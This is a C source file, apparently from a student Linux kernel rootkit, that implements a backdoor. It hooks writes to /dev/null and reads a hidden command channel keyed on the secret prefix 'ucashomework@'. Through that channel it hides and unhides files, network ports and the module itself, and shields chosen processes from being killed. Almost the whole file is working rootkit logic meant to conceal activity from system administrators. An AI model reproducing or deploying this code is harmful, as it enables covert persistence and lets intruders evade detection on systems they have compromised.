//
// Created by black on 22-10-12.
//

#include "backdoor.h"
#include "hook.h"
#include "data.h"
#include "module.h"
#include <linux/kernel.h>
#include <linux/namei.h>
#include <linux/fs.h>

static ssize_t (*origin_read_zero)(struct file *file, char __user *buf,
                                   size_t count, loff_t *ppos);

static ssize_t (*origin_write_null)(struct file *file, const char __user *buf,
                                    size_t count, loff_t *ppos);

// Optional
int test_open_proc(struct inode *inode, struct file *file) {
    printk(KERN_INFO "proc file opend.....\t");
    return 0;
}

// Optional
int test_release_proc(struct inode *inode, struct file *file) {
    printk(KERN_INFO "proc file released.....\n");
    return 0;
}

static char command[2];

/*
** This function will be called when we read the procfs file
*/
ssize_t test_read_proc(struct file *filp, char __user *buffer, size_t length, loff_t *offset) {
    pr_info("proc file read.....\n");

    return length;;
}


/*
** This function will be called when we write the procfs file
*/
ssize_t test_write_proc(struct file *filp, const char __user *buff, size_t len, loff_t *off) {
    pr_info("proc file wrote.....\n");

    // buff 是 user mod 地址，需要拷贝到内核中
    // 不然会造成 exc_page_fault 错误
    if (copy_from_user(command, buff, 2))
        return len;

    switch (command[0]) {
        case '0':
            break;
        case '1':
            break;
        default:
            break;
    }

    return len;
}

long HookReadZero(struct pt_regs *regs, long (*pFunction)(const struct pt_regs *)) {
//    origin_read_zero = (ssize_t (*)(struct file *, char *, size_t, loff_t *)) pFunction;
//    jump_func=
    return 0;
}


long HookWriteNull(struct pt_regs *regs, long (*pFunction)(const struct pt_regs *)) {
    origin_write_null = (ssize_t (*)(struct file *, const char *, size_t, loff_t *)) pFunction;
    jump_func = (volatile unsigned long) AfterJumpInWriteNull;
    return 1;
}

#define BUFSIZE 512
#define COMMAND_PREFIX "ucashomework@"
#define COMMAND_HIDE_FILE "hf@"
#define COMMAND_HIDE_MODULE "hm@"
#define COMMAND_HIDE_PORT "hp@"
#define COMMAND_PROTECT "p@"
#define COMMAND_UN_HIDE_FILE "uhf@"
#define COMMAND_UN_HIDE_MODULE "uhm@"
#define COMMAND_UN_HIDE_PORT "uhp@"
#define COMMAND_UN_PROTECT "up@"

ssize_t AfterJumpInWriteNull(struct file *file, const char __user *buf, size_t count, loff_t *ppos) {
    size_t left = count;
    char buffer[BUFSIZE] = {0};

    if (count >= BUFSIZE || count <= sizeof(COMMAND_PREFIX) || copy_from_user(buffer, buf, BUFSIZE))
        goto call_orgin;

    if (likely(strncmp(buffer, COMMAND_PREFIX, sizeof(COMMAND_PREFIX) - 1))) {
        goto call_orgin;
    }

    pr_info("buffer: %s\n", buffer);
    left -= sizeof(COMMAND_PREFIX) - 1;
    char *curr = buffer + sizeof(COMMAND_PREFIX) - 1;
    char *filename;
    struct path path;
    unsigned long inode;
    struct List temp = {.data=NULL};

    if (left > sizeof(COMMAND_HIDE_FILE) - 1 && !strncmp(curr, COMMAND_HIDE_FILE, sizeof(COMMAND_HIDE_FILE) - 1)) {
        curr = curr + sizeof(COMMAND_HIDE_FILE) - 1;
        if (!kern_path(curr, LOOKUP_FOLLOW | LOOKUP_MOUNTPOINT, &path)) {
            filename = path.dentry->d_iname;
            inode = path.dentry->d_inode->i_ino;
            pr_info("Exist file name: %s, inode_or_port: %lu\n", filename, inode);

            temp.data = filename;
            temp.inode_or_port = inode;
            AddEntry(temp, &filename_list);

            goto ret;
        } else {
            pr_err("Not exist file path: %s\n", curr);
        }
    } else if (left > sizeof(COMMAND_UN_HIDE_FILE) - 1 &&
               !strncmp(curr, COMMAND_UN_HIDE_FILE, sizeof(COMMAND_UN_HIDE_FILE) - 1)) {
        curr = curr + sizeof(COMMAND_UN_HIDE_FILE) - 1;
        temp.data = curr;
        DelEntryWithData(temp, &filename_list);
        goto ret;
    } else if (left > sizeof(COMMAND_HIDE_PORT) - 1 &&
               !strncmp(curr, COMMAND_HIDE_PORT, sizeof(COMMAND_HIDE_PORT) - 1)) {
        curr = curr + sizeof(COMMAND_HIDE_PORT) - 1;

        // 需要一个字符串长度，不然分配空间会出错
        temp.data = " ";
        temp.inode_or_port = 0;
        if (0 == kstrtou16(curr, 10, (u16 *) &(temp.inode_or_port))) {
            AddEntry(temp, &port_list);
            goto ret;
        }
    } else if (left > sizeof(COMMAND_UN_HIDE_PORT) - 1 &&
               !strncmp(curr, COMMAND_UN_HIDE_PORT, sizeof(COMMAND_UN_HIDE_PORT) - 1)) {
        curr = curr + sizeof(COMMAND_UN_HIDE_PORT) - 1;
        temp.inode_or_port = 0;
        if (0 == kstrtou16(curr, 10, (u16 *) &(temp.inode_or_port))) {
            DelEntryWithInode(temp, &port_list);
            goto ret;
        }
    } else if (left > sizeof(COMMAND_PROTECT) - 1 &&
               !strncmp(curr, COMMAND_PROTECT, sizeof(COMMAND_PROTECT) - 1)) {
        curr = curr + sizeof(COMMAND_PROTECT) - 1;

        // 需要一个字符串长度，不然分配空间会出错
        temp.data = " ";
        temp.inode_or_port = 0;
        pr_info("Protect: %s\n", curr);
        if (0 == kstrtoint(curr, 10, (int *) &(temp.inode_or_port))) {
            AddEntry(temp, &protect_process_list);
            goto ret;
        }
    } else if (left > sizeof(COMMAND_UN_PROTECT) - 1 &&
               !strncmp(curr, COMMAND_UN_PROTECT, sizeof(COMMAND_UN_PROTECT) - 1)) {
        curr = curr + sizeof(COMMAND_UN_PROTECT) - 1;
        temp.inode_or_port = 0;
        if (0 == kstrtoint(curr, 10, (int *) &(temp.inode_or_port))) {
            DelEntryWithInode(temp, &protect_process_list);
            goto ret;
        }
    } else if (left == sizeof(COMMAND_HIDE_MODULE) - 1 &&
               !strncmp(curr, COMMAND_HIDE_MODULE, sizeof(COMMAND_HIDE_MODULE) - 1)) {
        hide();
    } else if (left == sizeof(COMMAND_UN_HIDE_MODULE) - 1 &&
               !strncmp(curr, COMMAND_UN_HIDE_MODULE, sizeof(COMMAND_UN_HIDE_MODULE) - 1)) {
        show();
    }

    call_orgin:
    return origin_write_null(file, buf, count, ppos);

    ret:
    return count;
}

